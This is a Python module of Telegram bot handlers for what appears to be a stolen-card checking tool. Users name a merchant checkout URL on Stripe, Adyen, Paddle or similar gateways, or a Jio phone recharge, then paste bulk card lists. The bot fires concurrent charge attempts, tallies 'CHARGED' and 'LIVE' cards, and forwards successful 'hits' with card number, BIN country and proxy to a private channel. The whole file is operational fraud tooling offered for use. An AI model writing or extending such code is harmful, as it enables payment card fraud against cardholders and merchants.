import asyncio
import re
from telegram import Update
from telegram.ext import ContextTypes
from cards import parse_bulk, parse_line
import worker, db, config

PENDING: dict = {}   # (chat_id, msg_id) -> {"user_id": int, "url": str, "gateway": str}


def _fmt_result(r: dict) -> str:
    s = r["status"]
    emoji = {"CHARGED": "✅", "LIVE": "🟢", "3DS_CHALLENGE": "🔐",
             "CAPTCHA": "🧩", "DECLINED": "❌", "ERROR": "⚠️"}.get(s, "•")
    card = r["card"].get("formatted", "?")
    ms = r.get("response_time", 0)
    dc = r.get("decline_code") or "-"
    err = (r.get("error") or "-")[:80]
    return f"{emoji} `{card}` — *{s}* ({ms:.1f}s)\n   `{dc}` — {err}"


async def _fan_and_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                         user_id: int, url: str, gateway: str, cards: list):
    msg = await update.message.reply_text(
        f"🔨 Queued {len(cards)} card(s) → `{gateway}`\nChecking...", parse_mode="Markdown")

    results = await asyncio.gather(*[
        worker.run_hit(user_id, url, c, gateway=gateway) for c in cards
    ], return_exceptions=True)

    lines = []
    charged = 0
    for i, r in enumerate(results, 1):
        if isinstance(r, Exception):
            lines.append(f"⚠️ card {i} — `{type(r).__name__}`")
            continue
        if r.get("status") == "CHARGED":
            charged += 1
            await _forward_hit(ctx, r)
        lines.append(_fmt_result(r))

    header = f"*{charged}/{len(cards)} charged*\n\n"
    body = header + "\n".join(lines)
    if len(body) > 3800:
        body = body[:3800] + "\n…"
    await msg.edit_text(body, parse_mode="Markdown")


async def _forward_hit(ctx: ContextTypes.DEFAULT_TYPE, r: dict):
    if not config.HIT_CHANNEL_ID:
        return
    try:
        await ctx.bot.send_message(
            chat_id=config.HIT_CHANNEL_ID,
            text=(f"💳 *{r['status']}* — {r['gateway']}\n"
                  f"`{r['card'].get('formatted','?')}`\n"
                  f"brand={r.get('brand','?')} bin={r.get('bin_country','?')}\n"
                  f"ms={r.get('response_time',0):.1f} proxy={r.get('proxy_raw') or 'none'}"),
            parse_mode="Markdown",
        )
    except Exception:
        pass


def _register_pending(message_id: int, chat_id: int, url: str, gateway: str, user_id: int):
    PENDING[(chat_id, message_id)] = {"url": url, "gateway": gateway, "user_id": user_id}


def _make_cmd(gateway: str):
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        await db.upsert_user(u.id, u.username or u.first_name or "")
        if await db.is_banned(u.id):
            return
        if not ctx.args:
            return await update.message.reply_text(f"Usage: `/{gateway} <url>`", parse_mode="Markdown")
        url = ctx.args[0].strip()
        sent = await update.message.reply_text(
            f"🔗 `{gateway}` target set.\nReply to this message with cards.", parse_mode="Markdown")
        _register_pending(sent.message_id, sent.chat_id, url, gateway, u.id)
    return _cmd


cmd_ch      = _make_cmd("stripe")
cmd_adyen   = _make_cmd("adyen")
cmd_epoch   = _make_cmd("epoch")
cmd_checkout = _make_cmd("checkout")
cmd_paddle  = _make_cmd("paddle")
cmd_whop    = _make_cmd("whop")


async def cmd_jio(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await db.upsert_user(u.id, u.username or u.first_name or "")
    if await db.is_banned(u.id):
        return
    if len(ctx.args) < 2:
        return await update.message.reply_text("Usage: `/jio <phone> <amount>`", parse_mode="Markdown")
    phone, amount = ctx.args[0], ctx.args[1]
    try:
        amount = float(amount)
    except ValueError:
        return await update.message.reply_text("Amount must be numeric.")
    sent = await update.message.reply_text(
        f"📱 `{phone}` — ₹{amount:.2f}\nReply to this message with cards.", parse_mode="Markdown")
    _register_pending(sent.message_id, sent.chat_id,
                      f"jio://{phone}/{amount}", "jio", u.id)


async def on_reply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return
    key = (update.message.chat_id, update.message.reply_to_message.message_id)
    state = PENDING.get(key)
    if not state:
        return
    u = update.effective_user
    if state["user_id"] != u.id:
        return

    good, bad = parse_bulk(update.message.text or "")
    if not good:
        return await update.message.reply_text("No valid cards parsed.")
    if bad:
        await update.message.reply_text(f"⚠️ Skipped {len(bad)} malformed line(s).")

    PENDING.pop(key, None)
    if state["gateway"] == "jio":
        m = re.match(r"jio://([^/]+)/([\d.]+)", state["url"])
        if not m:
            return
        phone, amount = m.group(1), float(m.group(2))
        await _fan_jio(update, ctx, u.id, phone, amount, good)
    else:
        await _fan_and_check(update, ctx, u.id, state["url"], state["gateway"], good)


async def _fan_jio(update, ctx, user_id, phone, amount, cards):
    msg = await update.message.reply_text(f"🔨 Queued {len(cards)} card(s) for Jio ₹{amount:.2f}")
    results = await asyncio.gather(*[
        worker.run_jio(user_id, phone, amount, c) for c in cards
    ], return_exceptions=True)
    lines, charged = [], 0
    for i, r in enumerate(results, 1):
        if isinstance(r, Exception):
            lines.append(f"⚠️ {i} — {type(r).__name__}")
            continue
        if r.get("status") == "CHARGED":
            charged += 1
            await _forward_hit(ctx, r)
        lines.append(_fmt_result(r))
    body = f"*{charged}/{len(cards)} charged (Jio ₹{amount:.2f})*\n\n" + "\n".join(lines)
    await msg.edit_text(body[:3800], parse_mode="Markdown")